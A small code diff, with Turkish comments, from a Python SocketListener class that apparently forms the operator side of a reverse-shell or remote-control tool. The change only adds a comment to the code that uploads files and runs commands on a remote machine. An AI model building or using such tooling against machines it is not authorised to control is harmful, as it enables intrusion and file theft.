@@ -54,7 +54,7 @@ class SocketListener:
                 #burada karşıya yükleme yapacağımız için komutu kontrol edip bir veri oluşturcaz output burada olacak yani buradan göndercez
                 if command_input[0] == "upload":
                     file_content = self.get_file_content(command_input[1])
-                    command_input.append(file_content)
+                    command_input.append(file_content) #içindeki şeyi str içine alarak da dene çalışmazsa
 
                 command_output = self.command_ex(command_input)
                 #burada çıktıyı kendimize indirdiğimiz için karşıdan veriyi aldıktan sonra tuşu kontrol edip veriyi kaydedicez
